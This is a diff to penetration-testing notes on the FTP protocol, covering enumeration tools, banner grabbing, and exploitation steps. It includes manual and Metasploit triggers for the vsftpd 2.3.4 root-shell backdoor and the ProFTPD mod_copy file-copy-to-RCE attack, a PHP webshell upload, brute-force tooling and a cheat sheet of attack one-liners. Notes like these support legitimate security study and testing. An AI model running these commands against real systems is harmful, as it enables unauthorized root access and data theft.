@@ -1,12 +1,29 @@
+# FTP
+
 #FTP #FileTransferProtocol #filetransfer
 
 ## What is FTP?
-File Transfer Protocol — used to transfer files between client and server. Unencrypted by default; FTPS (explicit/implicit TLS) and SFTP (SSH-based) are secure alternatives.
+File Transfer Protocol — used to transfer files between client and server. Unencrypted by default; FTPS (explicit/implicit TLS) and SFTP (SSH-based, a different protocol — see [[Services/File Xfer/SFTP|SFTP]]) are secure alternatives.
 
 - Port **TCP 21** — command/control channel
 - Port **TCP 20** — data channel (active mode)
 - Passive mode: data channel port negotiated, client-initiated (firewall-friendly)
 - Anonymous login common on older/misconfigured servers
+- The **daemon version is the enumeration prize** — a handful of specific builds (vsftpd 2.3.4, ProFTPD ≤ 1.3.5) are unauthenticated RCE. Banner-grab first.
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|NMAP]] | Version/banner (`-sV`), `ftp-anon`/`ftp-bounce`/`ftp-brute` NSE |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `ftp_version`, `anonymous`, `ftp_login`, and the vsftpd/ProFTPD exploit modules |
+| [[Tools/Auth/Hydra\|Hydra]] | Online password brute force against 21 |
+| [[Tools/Auth/Medusa\|Medusa]] | Alternative online brute force (`-M ftp`) |
+| [[Tools/File Transfer/lftp\|lftp]] | FTPS client + recursive `mirror` download/upload |
+| [[Tools/File Transfer/wget\|wget]] | Recursive anonymous download (`wget -m ftp://…`) |
+| [[Tools/Web/openssl\|openssl]] | Inspect/negotiate FTPS TLS (`s_client -starttls ftp`) |
 
 ---
 
@@ -52,6 +69,12 @@ find / -type f -name "ftp*" 2>/dev/null | grep scripts
 use auxiliary/scanner/ftp/ftp_version
 use auxiliary/scanner/ftp/anonymous
 use auxiliary/scanner/ftp/ftp_login
+```
+
+```bash
+# Grab the banner — the daemon VERSION decides which unauth-RCE (if any) applies
+nc <target> 21                       # e.g. "220 (vsFTPd 2.3.4)" or "ProFTPD 1.3.5 Server"
+nmap -p 21 -sV <target>              # same, scripted
 ```
 
 ---
@@ -166,6 +189,46 @@ ftp> put shell.php
 # Then access via browser: http://<target>/shell.php?cmd=id
 ```
 
+### vsftpd 2.3.4 Backdoor (CVE-2011-2523)
+
+The vsftpd-2.3.4 source tarball was trojaned in 2011: a username ending in `:)` opens a **root** bind shell on **TCP 6200**. Unauthenticated. Confirm the version from the banner first.
+
+```bash
+# Manual trigger — login with a smiley, then connect to 6200
+nc <target> 21
+USER pwn:)
+PASS anything
+#   (login "fails", but the backdoor is now listening)
+nc <target> 6200
+id           # uid=0(root)
+
+# Metasploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <target>
+run
+```
+
+### ProFTPD mod_copy (CVE-2015-3306)
+
+ProFTPD ≤ 1.3.5 with `mod_copy` enabled honours `SITE CPFR` / `SITE CPTO` **without authentication** — an arbitrary server-side file copy. Chained with a co-hosted web server it's RCE: copy a PHP payload into the webroot, then request it.
+
+```bash
+# Prove the primitive (arbitrary read/copy, no login)
+nc <target> 21
+SITE CPFR /etc/passwd
+SITE CPTO /tmp/passwd.copy
+
+# RCE: plant a PHP payload, then copy it into the web root and hit it.
+# Metasploit automates the whole plant-and-copy (needs a writable, web-served dir):
+use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOSTS <target>
+set SITEPATH /var/www/html      # web root the FTP daemon can write to
+set TARGETURI /                 # URL path that maps to SITEPATH
+run
+```
+
+> [!warning] **mod_copy RCE needs a co-hosted, FTP-writable web root.** The copy primitive works unauthenticated, but turning it into code execution requires a directory the FTP daemon can write *and* the web server will execute — commonly `/var/www/html`. Without a co-hosted web app it's still an arbitrary file read/write (e.g. drop an SSH key, read `/etc/passwd`).
+
 ---
 
 ## Dangerous Settings
@@ -177,6 +240,9 @@ ftp> put shell.php
 | No TLS | Credentials and data in cleartext |
 | Writable directories | File upload/replacement |
 | `umask` too permissive | Uploaded files execute |
+| vsftpd **2.3.4** running | Unauthenticated root shell (CVE-2011-2523 backdoor) |
+| ProFTPD **≤ 1.3.5** with `mod_copy` | Unauth `SITE CPFR/CPTO` file copy → RCE (CVE-2015-3306) |
+| FTP daemon writable into a web-served dir | mod_copy / anon upload becomes RCE |
 
 ---
 
@@ -192,3 +258,13 @@ ftp> put shell.php
 | Bounce scan | `nmap -p 80 -b anon:anon@ftphost internalhost` |
 | TLS connect | `openssl s_client -connect host:21 -starttls ftp` |
 | Full nmap scan | `nmap -p 21 --script ftp-anon,ftp-bounce,ftp-brute` |
+| Banner / version | `nc host 21` (look for vsFTPd 2.3.4 / ProFTPD 1.3.5) |
+| vsftpd 2.3.4 backdoor | `USER x:)` then `nc host 6200` → root |
+| ProFTPD mod_copy RCE | `msf › exploit/unix/ftp/proftpd_modcopy_exec` |
+| FTPS mirror | `lftp -e "set ssl:verify-certificate no" -u u,p ftps://host` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-08-21*
+*Model: claude-opus-5*
